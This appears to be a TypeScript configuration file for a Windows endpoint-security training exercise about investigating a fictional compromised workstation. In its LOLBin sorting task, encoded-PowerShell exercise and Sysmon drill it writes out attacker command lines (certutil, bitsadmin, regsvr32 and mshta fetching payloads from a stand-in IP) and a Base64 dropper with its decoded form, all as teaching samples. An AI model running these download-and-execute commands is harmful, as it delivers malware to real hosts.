import type { RoomExperience } from "./types";

// "Operation Clean Host" for the "windows-fundamentals" room (rooms-batch-02.ts).
// Script: docs/campaign/05-windows-fundamentals.md.
// Station task ids must match the room's task order exactly (see getRoomExperience).
//
// Corvane Logistics (fictional), workstation CVN-WS-0418. Lab data differs
// from the graded tasks: no lsass.exe in a user folder (q1), persistence is
// found but the lab never asks which hive needs no admin rights (q2), the
// masquerading service lives in C:\Users\Public, not a svchost in ProgramData
// (q3), the decoded command drops a file rather than running an IEX cradle and
// the drill is certutil under cmd, not Word spawning PowerShell (la1, f1).
export const WINDOWS_FUNDAMENTALS: RoomExperience = {
  roomId: "windows-fundamentals",
  codename: "Operation Clean Host",
  theme: "endpoint",
  handler: { name: "Nadia Rahman", role: "Endpoint Security Lead, Corvane Logistics" },
  briefing: [
    "Corvane Logistics. Workstation CVN-WS-0418 has been acting strangely since Monday.",
    "Nadia Rahman hands you a console on the machine and one instruction: find everything that does not belong.",
    "Accounts, folders, registry, services, processes. Every one of them can hide an intruder.",
    "Clean this host, and you will know Windows the way attackers do.",
  ],
  mission: "Investigate a live Windows workstation from its own consoles: audit accounts and UAC, hunt persistence in the registry and services, triage processes, decode an obfuscated command, and work the Word and PowerShell alert.",
  estimate: "~50 min",
  look: { primary: "#3b9eff", secondary: "#a78bfa", warn: "#f43f5e" },
  scene: "facilitywindowsfundamentals",
  layout: "facility",
  story: {
    intro: { title: "Something Does Not Belong", src: "https://wrxhxtdllbctsawvewue.supabase.co/storage/v1/object/public/lesson-videos/operation/windows-fundamentals/clean-host-intro-2727c796.mp4", poster: "https://wrxhxtdllbctsawvewue.supabase.co/storage/v1/object/public/lesson-videos/operation/windows-fundamentals/clean-host-intro-eb660c88.jpg" },
    afterStation: {
      persistence: { title: "Survives Every Reboot", src: "https://wrxhxtdllbctsawvewue.supabase.co/storage/v1/object/public/lesson-videos/operation/windows-fundamentals/clean-host-ch2-c15e1e9f.mp4", poster: "https://wrxhxtdllbctsawvewue.supabase.co/storage/v1/object/public/lesson-videos/operation/windows-fundamentals/clean-host-ch2-ad1ba19a.jpg" },
      processes: { title: "Impostors", src: "https://wrxhxtdllbctsawvewue.supabase.co/storage/v1/object/public/lesson-videos/operation/windows-fundamentals/clean-host-ch3-d2323ae8.mp4", poster: "https://wrxhxtdllbctsawvewue.supabase.co/storage/v1/object/public/lesson-videos/operation/windows-fundamentals/clean-host-ch3-fef03e73.jpg" },
      macro: { title: "Host Clean", src: "https://wrxhxtdllbctsawvewue.supabase.co/storage/v1/object/public/lesson-videos/operation/windows-fundamentals/clean-host-finale-59881ad6.mp4", poster: "https://wrxhxtdllbctsawvewue.supabase.co/storage/v1/object/public/lesson-videos/operation/windows-fundamentals/clean-host-finale-deaebd1e.jpg" },
    },
  },
  stations: [
    {
      id: "machine",
      label: "The Machine",
      topic: "Kernel and user space · key folders · local, domain and built-in accounts · UAC",
      tagline: "Learn where things live on Windows, then audit who has power on this machine",
      building: "control",
      taskIds: ["win-fund-r1"],
    },
    {
      id: "persistence",
      label: "Persistence Hunt",
      topic: "The registry · hives · Run keys · services",
      tagline: "Something survives every reboot. Query the registry and services until you find it",
      building: "vault",
      taskIds: ["win-fund-r2", "win-fund-q2"],
    },
    {
      id: "processes",
      label: "Process Patrol",
      topic: "Processes and parents · masquerading · PowerShell abuse · LOLBins",
      tagline: "Real or impostor? Triage the process list, then decode what an attacker ran",
      building: "lab",
      taskIds: ["win-fund-r3", "win-fund-q1", "win-fund-q3"],
    },
    {
      id: "defenders",
      label: "PowerShell for Defenders",
      topic: "Get-Process · Get-Service · Get-WinEvent · Get-ChildItem · the object pipeline",
      tagline: "Turn the attacker's favourite tool into your investigation console",
      building: "office",
      taskIds: ["win-fund-r4"],
    },
    {
      id: "macro",
      label: "The PowerShell Alert",
      topic: "Reading a process-creation alert: parent, child, command line",
      tagline: "The EDR fires on a document that opened something it never should",
      building: "ticket",
      taskIds: ["win-fund-la1", "win-fund-f1"],
      boss: true,
    },
  ],
  personas: {
    "win-fund-q2": {
      name: "Nadia Rahman",
      role: "Endpoint Security Lead",
      line: "The attacker never got admin rights, yet the implant survives reboots. Where could it have written itself?",
    },
    "win-fund-q1": {
      name: "Sam Whitlock",
      role: "Incident Responder",
      line: "Look at where this one is running from. Tell me what you think it is.",
    },
    "win-fund-q3": {
      name: "Sam Whitlock",
      role: "Incident Responder",
      line: "New service on a server, Microsoft-sounding name. Something about it bothers me.",
    },
  },
  briefings: {
    // ── Reading 1: architecture, folders, accounts, UAC ──
    "win-fund-r1": [
      {
        kind: "sort",
        title: "Where Does It Live?",
        prompt: "Location is half of every Windows investigation. Is each file where it belongs, or somewhere it should never be?",
        buckets: [
          { id: "ok", label: "Where it belongs" },
          { id: "bad", label: "Suspicious location" },
        ],
        items: [
          { id: "cmd", text: "C:\\Windows\\System32\\cmd.exe", bucket: "ok", why: "Core system binaries live in System32." },
          { id: "expl", text: "C:\\Windows\\System32\\explorer.exe", bucket: "bad", why: "The genuine explorer.exe lives one level up, in C:\\Windows. A copy in System32 is an impostor." },
          { id: "expl2", text: "C:\\Windows\\explorer.exe", bucket: "ok", why: "This is the real Windows shell." },
          { id: "roam", text: "C:\\Users\\r.adams\\AppData\\Roaming\\svch0st.exe", bucket: "bad", why: "A misspelt system name in a user-writable folder: two red flags at once." },
          { id: "temp", text: "C:\\Users\\r.adams\\AppData\\Local\\Temp\\invoice_9921.exe", bucket: "bad", why: "Executables launching from Temp are a classic dropper pattern." },
          { id: "pf", text: "C:\\Program Files\\7-Zip\\7z.exe", bucket: "ok", why: "Installed software lives in Program Files, which needs admin rights to write." },
          { id: "def", text: "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.24090.11-0\\MsMpEng.exe", bucket: "ok", why: "A real exception: Defender's engine runs from ProgramData. Location is a clue, never a verdict on its own." },
        ],
      },
      {
        kind: "deduce",
        title: "Who Made the New Admin?",
        prompt: "Nadia shows you a sister workstation, CVN-WS-0431. A local admin called svc_update2 appeared there overnight. Strike out the accounts that cannot have created it as the clues come in, then accuse.",
        nameColumn: "Account",
        columns: ["Kind", "Local rights", "Last sign-in", "Admin token"],
        suspects: [
          { id: "okafor", name: "m.okafor", cells: ["Domain user", "Standard user", "07:52 yesterday", "Never elevates"] },
          { id: "helpdesk", name: "it.helpdesk", cells: ["Domain group member", "Local admin via helpdesk group", "14:05 yesterday", "After a UAC prompt"] },
          { id: "ing", name: "i.ng", cells: ["Domain account", "Domain Admins", "01:10 today", "After a UAC prompt"] },
          { id: "administrator", name: "Administrator", cells: ["Built-in local", "Administrators", "01:14 today", "Always, no prompt"] },
          { id: "patch", name: "svc_patch", cells: ["Local service account", "Runs tasks as System", "01:00 today", "Runs as System"] },
          { id: "guest", name: "Guest", cells: ["Built-in local", "Guests", "Never", "Never elevates"] },
        ],
        clues: [
          "Event 4720 for svc_update2 was written at 01:19 by a session holding the full administrator token.",
          "That session was an interactive console logon opened within the last ten minutes: a person at a keyboard, not a scheduled task.",
          "The logon was checked against this machine's own account database. No domain controller was asked.",
        ],
        culprit: "administrator",
        why: "The built-in Administrator signed in at 01:14 against the local database and created the account five minutes later. It should be disabled or renamed, and unlike other admins it gets a full token with no UAC prompt. The standard user and Guest stay at Medium or Low and cannot create accounts. The help-desk account last signed in the afternoon before, and svc_patch is a task rather than a person. i.ng is the near miss: a Domain Admin at night deserves a change-ticket check, but a domain sign-in is verified by a domain controller, not the local database.",
      },
    ],
    // ── Reading 2: the registry and services ──
    "win-fund-r2": [
      {
        kind: "spotdiff",
        title: "Golden Image vs the Host",
        prompt: "IT keeps a golden-image export of the Run keys and service configuration. Compare it with CVN-WS-0418 today and tap every entry that was tampered with. Patch-level changes are harmless: do not tap those.",
        goodTitle: "Golden image (reg query + sc qc)",
        suspectTitle: "CVN-WS-0418 today",
        good: [
          "HKLM Run  SecurityHealth  %windir%\\system32\\SecurityHealthSystray.exe",
          "HKLM Run  RtkAudUService  \"C:\\Windows\\System32\\RtkAudUService64.exe\" -background",
          "HKCU Run  OneDrive  \"C:\\Users\\r.adams\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe\" /background",
          "HKCU Run  Zoom  \"C:\\Users\\r.adams\\AppData\\Roaming\\Zoom\\bin\\Zoom.exe\" --background",
          "SVC Spooler  AUTO_START  C:\\Windows\\System32\\spoolsv.exe  LocalSystem",
          "SVC Dnscache  AUTO_START  C:\\Windows\\system32\\svchost.exe -k NetworkService -p  NT AUTHORITY\\NetworkService",
          "SVC GoogleChromeElevationService  DEMAND_START  \"C:\\Program Files\\Google\\Chrome\\Application\\130.0.6723.70\\elevation_service.exe\"  LocalSystem",
          "SVC WinDefend  AUTO_START  \"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.24090.11-0\\MsMpEng.exe\"  LocalSystem",
          "SVC Themes  AUTO_START  C:\\Windows\\System32\\svchost.exe -k netsvcs -p  LocalSystem",
          "SVC EventLog  AUTO_START  C:\\Windows\\System32\\svchost.exe -k LocalServiceNetworkRestricted -p  NT AUTHORITY\\LocalService",
        ],
        suspect: [
          "HKLM Run  SecurityHealth  %windir%\\system32\\SecurityHealthSystray.exe",
          "HKLM Run  RtkAudUService  \"C:\\Windows\\System32\\RtkAudUService64.exe\" -background",
          "HKCU Run  OneDrive  \"C:\\Users\\r.adams\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe\" /background",
          "HKCU Run  Zoom  \"C:\\Users\\r.adams\\AppData\\Local\\Temp\\Zoom.exe\" --background",
          "SVC Spooler  AUTO_START  C:\\Windows\\System32\\spoolsv.exe  LocalSystem",
          "SVC Dnscache  AUTO_START  C:\\Windows\\system32\\svchost.exe -k NetworkService -p  LocalSystem",
          "SVC GoogleChromeElevationService  DEMAND_START  \"C:\\Program Files\\Google\\Chrome\\Application\\130.0.6723.92\\elevation_service.exe\"  LocalSystem",
          "SVC WinDefend  AUTO_START  \"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.24100.4-0\\MsMpEng.exe\"  LocalSystem",
          "SVC Themes  AUTO_START  C:\\Users\\Public\\svchost.exe -k netsvcs -p  LocalSystem",
          "SVC EventLog  AUTO_START  C:\\Windows\\System32\\svchost.exe -k LocalServiceNetworkRestricted -p  NT AUTHORITY\\LocalService",
        ],
        diffs: [
          { line: 3, why: "Same value name, different folder. The real Zoom lives under Roaming\\Zoom\\bin; a Zoom.exe sitting in Temp is a copy. It sits in HKCU, so the user's own rights were enough to plant it." },
          { line: 5, why: "Dnscache ran as NetworkService and now runs as LocalSystem with the same path. Always read the service account column: a quiet upgrade to SYSTEM is a foothold with more power than an administrator." },
          { line: 8, why: "A built-in service whose ImagePath now points into C:\\Users\\Public. A service binary in a folder every user can write is the signature of a planted or hijacked service; real svchost.exe only runs from System32." },
        ],
        decoys: [
          { line: 6, why: "Chrome's folder is named after its version, and the new build is still under Program Files. A version bump is an update, not tampering." },
          { line: 7, why: "Defender updates its platform monthly and its engine genuinely runs from ProgramData. A new platform version folder is expected; location is a clue, not a verdict." },
        ],
        lesson: "A baseline turns a hunt into a diff. Check the hive (HKCU needs no admin), the folder the binary runs from, and the account a service runs as, and treat a version change in a trusted folder as maintenance.",
      },
      {
        kind: "match",
        title: "Know the Hives",
        prompt: "Five root keys hold everything. Match each hive to what it stores.",
        pairs: [
          { id: "hklm", left: "HKEY_LOCAL_MACHINE", right: "Settings for the whole computer: software, services, drivers", why: "Machine-wide, so writing here needs admin rights." },
          { id: "hkcu", left: "HKEY_CURRENT_USER", right: "Settings for the user who is logged on", why: "Each user's own preferences and Run key." },
          { id: "hku", left: "HKEY_USERS", right: "Every loaded user profile, stored by SID", why: "HKCU is really one SID under here." },
          { id: "hkcr", left: "HKEY_CLASSES_ROOT", right: "File associations and COM object registrations", why: "COM hijacking lives here." },
          { id: "hkcc", left: "HKEY_CURRENT_CONFIG", right: "The current hardware profile", why: "Rarely touched by attackers." },
        ],
      },
    ],
    // ── Reading 3: processes, PowerShell abuse, LOLBins ──
    "win-fund-r3": [
      {
        kind: "queue",
        title: "Process Triage",
        prompt: "Six processes from CVN-WS-0418. Check the path, the parent and the user. Real, or impostor?",
        console: "EDR · Process list · CVN-WS-0418",
        actions: [
          { id: "ok", label: "Legitimate", tone: "close" },
          { id: "sus", label: "Suspicious", tone: "escalate" },
        ],
        alerts: [
          { id: "svchost", time: "PID 1144", severity: "Low", rule: "svchost.exe", entity: "SYSTEM",
            fields: [{ k: "path", v: "C:\\Windows\\System32\\svchost.exe" }, { k: "command", v: "svchost.exe -k netsvcs -p" }, { k: "parent", v: "services.exe" }, { k: "user", v: "NT AUTHORITY\\SYSTEM" }],
            context: "System32, started by services.exe, with a -k service group.", answer: "ok", why: "Exactly how a genuine service host looks: right path, right parent, a -k group." },
          { id: "explorer", time: "PID 7720", severity: "High", rule: "explorer.exe", entity: "r.adams",
            fields: [{ k: "path", v: "C:\\Windows\\System32\\explorer.exe" }, { k: "parent", v: "cmd.exe" }, { k: "user", v: "CORVANE\\r.adams" }, { k: "signer", v: "not signed" }],
            context: "A second explorer.exe, launched from a command prompt.", answer: "sus", why: "The real explorer.exe lives in C:\\Windows, is signed by Microsoft and is started by userinit at logon, not by cmd.exe." },
          { id: "onedrive", time: "PID 6088", severity: "Low", rule: "OneDrive.exe", entity: "r.adams",
            fields: [{ k: "path", v: "C:\\Users\\r.adams\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe" }, { k: "parent", v: "explorer.exe" }, { k: "signer", v: "Microsoft Corporation (valid)" }],
            context: "Runs from AppData, started at logon, validly signed.", answer: "ok", why: "OneDrive genuinely installs per user under AppData\\Local. AppData is a clue to check, not a verdict: the signature and parent settle it." },
          { id: "csrss", time: "PID 9012", severity: "Critical", rule: "csrss.exe", entity: "r.adams",
            fields: [{ k: "path", v: "C:\\Users\\Public\\csrss.exe" }, { k: "parent", v: "wscript.exe" }, { k: "user", v: "CORVANE\\r.adams" }],
            context: "A core Windows process name, from a public folder, started by a script host.", answer: "sus", why: "The real csrss.exe only runs from System32, as SYSTEM, started during boot. This is masquerading." },
          { id: "rundll", time: "PID 8840", severity: "High", rule: "rundll32.exe", entity: "r.adams",
            fields: [{ k: "path", v: "C:\\Windows\\System32\\rundll32.exe" }, { k: "command", v: "rundll32.exe C:\\Users\\Public\\upd.dll,Start" }, { k: "parent", v: "EXCEL.EXE" }],
            context: "A genuine Windows binary, but loading a DLL from a public folder, launched by Excel.", answer: "sus", why: "The binary is real; the abuse is in the command line and the parent. A LOLBin running a DLL dropped by a spreadsheet." },
          { id: "winlogon", time: "PID 676", severity: "Low", rule: "winlogon.exe", entity: "SYSTEM",
            fields: [{ k: "path", v: "C:\\Windows\\System32\\winlogon.exe" }, { k: "parent", v: "smss.exe (exited)" }, { k: "user", v: "NT AUTHORITY\\SYSTEM" }],
            context: "Started at boot by the session manager, from System32.", answer: "ok", why: "Correct path, SYSTEM, started by smss.exe during boot. Normal." },
        ],
      },
      {
        kind: "sort",
        title: "Admin or Attacker?",
        prompt: "Living-off-the-land binaries are signed Microsoft tools. The command line tells you who is using them. Sort each one.",
        buckets: [
          { id: "admin", label: "Normal admin use" },
          { id: "attack", label: "Attacker use" },
        ],
        items: [
          { id: "certdl", text: "certutil -urlcache -split -f http://203.0.113.90/a.txt C:\\Users\\Public\\a.exe", bucket: "attack", why: "certutil is for certificates; downloading an executable with it is a classic abuse." },
          { id: "certok", text: "certutil -dump C:\\certs\\webserver.cer", bucket: "admin", why: "Inspecting a certificate file: exactly what certutil is for." },
          { id: "regsvr", text: "regsvr32 /s /n /u /i:http://203.0.113.90/p.sct scrobj.dll", bucket: "attack", why: "The 'Squiblydoo' technique: a remote scriptlet run through a signed binary." },
          { id: "regok", text: "regsvr32 /s \"C:\\Program Files\\Vendor\\component.dll\"", bucket: "admin", why: "Registering a local DLL from Program Files: a normal installer step." },
          { id: "mshta", text: "mshta http://203.0.113.90/update.hta", bucket: "attack", why: "Running a remote HTML application: almost never legitimate in an office." },
          { id: "bits", text: "bitsadmin /transfer job /download http://203.0.113.90/t.exe C:\\Users\\Public\\t.exe", bucket: "attack", why: "BITS hides the download inside a trusted Windows service." },
        ],
      },
      {
        kind: "inspect",
        title: "Read the Encoded Command",
        prompt: "EDR caught this on CVN-WS-0418: powershell.exe -NoP -W Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACcAaAB0AHQAcAA6AC8ALwAyADAAMwAuADAALgAxADEAMwAuADkAMAAvAHUALgBlAHgAZQAnACAALQBPAHUAdABGAGkAbABlACAAJABlAG4AdgA6AFQARQBNAFAAXAB1AC4AZQB4AGUAOwAgAFMAdABhAHIAdAAtAFAAcgBvAGMAZQBzAHMAIAAkAGUAbgB2ADoAVABFAE0AUABcAHUALgBlAHgAZQA= . Decode it to see what it really did.",
        artifact: "EDR · Process creation · powershell.exe · CVN-WS-0418",
        items: [
          { id: "bin", text: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", tag: "Binary", tone: "trust", note: "The genuine, signed Microsoft binary in its proper folder. Nothing is wrong with the file: the abuse is entirely in the arguments." },
          { id: "nop", text: "-NoP", tag: "Flag", tone: "warn", note: "NoProfile: skip the profile scripts. Analysts rarely need it; attackers use it so nothing local changes how the shell behaves." },
          { id: "hid", text: "-W Hidden", tag: "Flag", tone: "warn", note: "WindowStyle Hidden: no console appears for the user. Legitimate automation can do this too, so it is a clue, not a verdict, but a user session launching it is odd." },
          { id: "enc", text: "-EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0AC...", tag: "Payload", tone: "warn", note: "Base64 of UTF-16LE text. The tell is the pattern: every second character is an A, because each character is two bytes and the second is zero. A string that starts SQBuAHYA decodes to the letters Inv, the start of Invoke." },
          { id: "dec", text: "[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('...'))", tag: "How to decode", tone: "info", note: "Use Unicode, not UTF8. UTF8 prints the letters with dots between them and looks like garbage. Decoding is the first step with any encoded command, and it is safe: it only prints text." },
          { id: "out", text: "Decoded: Invoke-WebRequest -Uri 'http://203.0.113.90/u.exe' -OutFile $env:TEMP\\u.exe; Start-Process $env:TEMP\\u.exe", tag: "Decoded", tone: "warn", note: "Download, save to the user-writable Temp folder, then run it with Start-Process: a two-step dropper hidden behind Base64 and a hidden window. Hash u.exe from Temp and block the address." },
          { id: "par", text: "Parent: cmd.exe, started by explorer.exe in r.adams's session", tag: "Context", tone: "info", note: "The parent decides who is typing. A user session launching a hidden, encoded PowerShell is the shape to escalate; the same flags from a management agent at a maintenance window are another story." },
        ],
      },
    ],
    // ── Reading 4: PowerShell for defenders ──
    "win-fund-r4": [
      {
        kind: "terminal",
        title: "Hunt with PowerShell",
        prompt: "Now the same shell works for you. Use PowerShell to pull the evidence Nadia needs for the incident ticket.",
        shell: "powershell",
        host: "PS C:\\Investigation>",
        commands: [
          { match: "get-process(\\s*\\|.*)?", help: "Get-Process | Sort-Object CPU -Descending | Select-Object -First 5",
            output: "Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName\n-------  ------    -----      -----     ------     --  -- -----------\n    214      19   812440     820112   2150.44   5532   0 svcupd\n   2380     101   402112     388004    611.20   3016   1 chrome\n   1188      58   220540     231988    140.75   6088   1 OneDrive\n    902      44   160112     171230     92.01   7740   1 OUTLOOK\n   3021     120   140887     150020     61.33   1144   0 svchost" },
          { match: "get-service(\\s+.*)?", help: "Get-Service WinDefend, PrintHelperSvc",
            output: "Status   Name               DisplayName\n------   ----               -----------\nStopped  WinDefend          Microsoft Defender Antivirus Service\nRunning  PrintHelperSvc     Print Helper\nRunning  Spooler            Print Spooler" },
          { match: "get-winevent.*7045.*", help: "Get-WinEvent -FilterHashtable @{LogName='System'; Id=7045} -MaxEvents 3",
            output: "   ProviderName: Service Control Manager\n\nTimeCreated            Id LevelDisplayName Message\n-----------            -- ---------------- -------\n03/11/2026 02:17:09  7045 Information      A service was installed in the system.\n                                           Service Name:  Print Helper\n                                           Service File Name:  C:\\Users\\Public\\svcupd.exe\n                                           Service Type:  user mode service\n                                           Service Start Type:  auto start\n                                           Service Account:  LocalSystem\n14/10/2026 09:40:51  7045 Information      A service was installed in the system.\n                                           Service Name:  Google Chrome Elevation Service\n                                           Service File Name:  \"C:\\Program Files\\Google\\Chrome\\Application\\130.0.6723.70\\elevation_service.exe\"" },
          { match: "get-childitem.*appdata.*", help: "Get-ChildItem $env:APPDATA -Recurse -Include *.exe",
            output: "    Directory: C:\\Users\\r.adams\\AppData\\Roaming\\chrome_upd\n\nMode                 LastWriteTime         Length Name\n----                 -------------         ------ ----\n-a----        03/11/2026     02:15         418304 chrome.exe\n\n    Directory: C:\\Users\\r.adams\\AppData\\Roaming\\Zoom\\bin\n\nMode                 LastWriteTime         Length Name\n----                 -------------         ------ ----\n-a----        21/09/2026     11:02        1290112 Zoom.exe" },
        ],
        objectives: [
          { id: "cpu", task: "Which process is burning the most CPU?", hint: "Get-Process | Sort-Object CPU -Descending | Select-Object -First 5", answer: ["svcupd", "svcupd.exe"], why: "svcupd: the binary behind the planted 'Print Helper' service. Heavy, constant CPU on a planted binary often means a coin miner or a busy implant." },
          { id: "def", task: "What state is the Microsoft Defender Antivirus service (WinDefend) in?", hint: "Get-Service WinDefend", answer: ["Stopped"], why: "Attackers stop the antivirus before they act. A stopped WinDefend on a managed laptop is an alert on its own." },
          { id: "when", task: "At what time was the 'Print Helper' service installed (HH:MM)?", hint: "Get-WinEvent -FilterHashtable @{LogName='System'; Id=7045} -MaxEvents 3", answer: ["02:17", "02:17:09"], why: "Event 7045 records every new service. 02:17, two minutes after chrome.exe was written to Roaming at 02:15: the timeline is building itself." },
          { id: "exe", task: "How many .exe files sit under AppData\\Roaming?", hint: "Get-ChildItem $env:APPDATA -Recurse -Include *.exe", answer: ["2", "two"], why: "Two: a genuine Zoom from September, and chrome.exe written at 02:15 that night. Timestamps separate them." },
        ],
      },
    ],
    // Drill before the graded alert: a different process-creation event.
    "win-fund-la1": [
      {
        kind: "anatomy",
        title: "Anatomy of a Process-Creation Event",
        prompt: "Your alert is a process creation. Nadia shows you one from another host, as Sysmon records it (Event ID 1), field by field.",
        source: "Sysmon · Microsoft-Windows-Sysmon/Operational · Event ID 1",
        fields: [
          { key: "UtcTime", value: "2026-11-03 02:21:44.912" },
          { key: "ProcessId", value: "6204" },
          { key: "Image", value: "C:\\Windows\\System32\\certutil.exe", label: "What ran", note: "The full path of the program. Right folder, real Microsoft binary." },
          { key: "OriginalFileName", value: "CertUtil.exe", label: "Real name", note: "Taken from the file itself. If someone renames a copy, Image changes but this does not." },
          { key: "CommandLine", value: "certutil -urlcache -split -f http://203.0.113.90/k.txt C:\\Users\\Public\\k.exe", label: "What it was told to do", note: "The most important field: a certificate tool downloading an executable. The binary is clean; the command line is the attack." },
          { key: "CurrentDirectory", value: "C:\\Users\\Public\\" },
          { key: "User", value: "CORVANE\\l.fischer", label: "As whom", note: "The account that ran it. Ask: does this person ever need certutil?" },
          { key: "IntegrityLevel", value: "Medium", label: "With what rights", note: "Medium: a normal, non-elevated user process." },
          { key: "Hashes", value: "SHA256=5d1f3a2c0b9e7d6a4c8f2e1b0a9d7c6e5f4a3b2c1d0e9f8a7b6c5d4e3f2a1b0c", label: "Fingerprint", note: "The hash of the binary that ran. For a genuine certutil it matches Microsoft's; look it up for any unknown program." },
          { key: "ParentImage", value: "C:\\Windows\\System32\\cmd.exe", label: "Who started it", note: "The parent. Then ask who started the parent: walk the tree up until it explains itself." },
          { key: "ParentCommandLine", value: "cmd.exe /c certutil -urlcache -split -f http://203.0.113.90/k.txt C:\\Users\\Public\\k.exe" },
        ],
        summary: "On another host, l.fischer's session ran cmd.exe, which ran certutil to download k.exe into C:\\Users\\Public. A trusted binary doing an untrusted job: parent, child and command line together tell the story.",
      },
    ],
  },
};
